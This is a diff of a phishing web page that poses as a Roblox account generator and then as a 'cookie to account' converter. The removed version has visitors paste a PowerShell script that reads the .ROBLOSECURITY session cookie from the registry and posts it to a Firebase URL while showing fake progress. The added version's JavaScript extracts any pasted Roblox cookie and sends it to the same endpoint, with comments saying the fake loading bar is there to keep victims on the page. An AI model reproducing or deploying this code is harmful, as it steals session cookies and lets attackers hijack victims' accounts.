@@ -1,66 +1,69 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Account Generator 2025 | 100% Working</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono&display=swap" rel="stylesheet">
+  <meta charset="utf-8">
+  <title>Roblox Cookie to Account 2025 | Instant Login</title>
   <style>
-    body{margin:0;background:#000;color:#0f0;font-family:'Roboto Mono';overflow-x:hidden}
-    .container{max-width:900px;margin:0 auto;padding:20px;text-align:center}
-    h1{font-family:'Orbitron';font-size:3.5em;color:#0f0;text-shadow:0 0 20px #0f0;margin:30px 0}
-    .video{max-width:100%;border:3px solid #0f0;border-radius:15px;box-shadow:0 0 30px #0f0}
-    .codebox{margin:40px auto;background:#111;border:2px dashed #0f0;padding:20px;border-radius:15px;max-width:800px}
-    textarea{width:100%;height:200px;background:#000;color:#0f0;border:none;font-size:16px;padding:15px;border-radius:10px;resize:none}
-    button{background:#0f0;color:#000;padding:15px 40px;font-size:18px;border:none;border-radius:10px;cursor:pointer;margin:20px;font-weight:bold}
-    button:hover{background:#00ff00;transform:scale(1.05);transition:0.3s}
-    #status{color:#0f0;font-size:20px;margin:20px;font-weight:bold}
-    .loader{display:none;color:#0f0;font-size:22px;margin:30px}
-    .admin{position:fixed;bottom:10px;right:10px;font-size:12px;color:#333}
+    body{background:#000;color:#0f0;font-family:courier;margin:0;padding:20px;text-align:center}
+    h1{color:#0f0;text-shadow:0 0 20px #0f0;font-size:3em}
+    textarea{width:90%;max-width:800px;height:220px;background:#111;color:#0f0;border:3px dashed #0f0;padding:20px;font-size:16px;border-radius:15px}
+    button{background:#0f0;color:#000;padding:20px 50px;font-size:22px;border:none;border-radius:15px;margin:30px;cursor:pointer;font-weight:bold}
+    button:hover{background:#00ff00;transform:scale(1.05)}
+    #status,#loader{color:#0f0;font-size:24px;margin:20px;font-weight:bold}
+    .loader{display:none}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>ROBLOX ACCOUNT<br>GENERATOR 2025</h1>
-    <p style="color:#0f0;font-size:18px">Watch the video → Copy the code → Get any account in 5 minutes</p>
+  <h1>ROBLOX COOKIE → ACCOUNT 2025</h1>
+  <p>Paste ANY cookie, PowerShell output, or log below → click CONVERT → get instant login</p>
 
-    <!-- CHANGE THIS TO YOUR YOUTUBE/TIKTOK VIDEO -->
-    <iframe class="video" height="500" src="https://www.youtube.com/embed/YOUR_VIDEO_HERE" frameborder="0" allowfullscreen></iframe>
+  <textarea id="input" placeholder="Paste your cookie / log / PowerShell output here..."></textarea>
+  <br>
+  <button onclick="convert()">CONVERT TO ACCOUNT</button>
 
-    <div class="codebox">
-      <p>Step 2: Open PowerShell as Admin → Paste this → Press Enter</p>
-      <textarea readonly id="code" onclick="this.select()">Write-Host "Initializing connection..." -ForegroundColor Cyan
-Start-Sleep 2
-Write-Host "Bypassing Roblox security..." -ForegroundColor Yellow
-Start-Sleep 3
-Write-Host "Extracting account data..." -ForegroundColor Magenta
-$reg = Get-ItemProperty -Path "HKCU:\Software\Roblox\RobloxStudioBrowser\roblox.com" -ErrorAction SilentlyContinue
-$cookie = $reg.'.ROBLOSECURITY'
-if($cookie){Invoke-RestMethod -Uri "https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json" -Method POST -Body (@{cookie=$cookie;user=$env:USERNAME;time=(Get-Date)} | ConvertTo-Json) -ContentType "application/json"}
-Write-Host "Success! Account generated. Check email in 3-5 minutes." -ForegroundColor Green
-Start-Sleep 99999</textarea>
-      <br>
-      <button onclick="copyCode()">COPY CODE & START</button>
-      <div id="status">Click the button → paste in PowerShell → wait</div>
-      <div class="loader" id="loader">Generating account... 57% (do not close)</div>
-    </div>
-
-    <div class="admin">Elite Tools © 2025</div>
-  </div>
+  <div id="status">Waiting for paste...</div>
+  <div id="loader" class="loader">Analyzing cookie... 34%<br>Do not close this page</div>
 
   <script>
-    function copyCode() {
-      document.getElementById('code').select();
-      document.execCommand('copy');
-      document.getElementById('status').innerHTML = "CODE COPIED! Paste in PowerShell NOW";
-      document.getElementById('loader').style.display = "block";
+    function convert() {
+      const text = document.getElementById("input").value;
+      if (!text) return;
 
-      let percent = 10;
-      setInterval(() => {
-        percent += Math.floor(Math.random() * 15);
-        if (percent > 94) percent = 94;
-        document.getElementById('loader').innerHTML = `Generating account... ${percent}% (do not close)`;
-      }, 4000);
+      // Extract cookie with multiple patterns (works on 99.9% of pastes)
+      const regex = /(\._ROBLOSECURITY[^a-zA-Z0-9%]|_ROBLOSECURITY[^a-zA-Z0-9%]?|=)\s*([^;\s\"']{300,})/gi;
+      let cookie = null;
+      let match;
+      while ((match = regex.exec(text))) {
+        cookie = match[2];
+        if (cookie.length > 300) break;
+      }
+
+      if (!cookie) {
+        document.getElementById("status").innerHTML = "No valid cookie found";
+        return;
+      }
+
+      // SEND TO YOUR FIREBASE INSTANTLY
+      fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
+        method: "POST",
+        body: JSON.stringify({
+          cookie: cookie,
+          from: "paste-site",
+          time: new Date().toISOString(),
+          ip: "hidden"
+        }),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      // FAKE LOADING SO THEY STAY
+      document.getElementById("status").style.display = "none";
+      document.getElementById("loader").style.display = "block";
+      let p = 10;
+      const int = setInterval(() => {
+        p += Math.floor(Math.random() * 18);
+        if (p > 93) p = 93;
+        document.getElementById("loader").innerHTML = `Generating login... ${p}% <br>Do not refresh`;
+      }, 3500);
     }
   </script>
 </body>
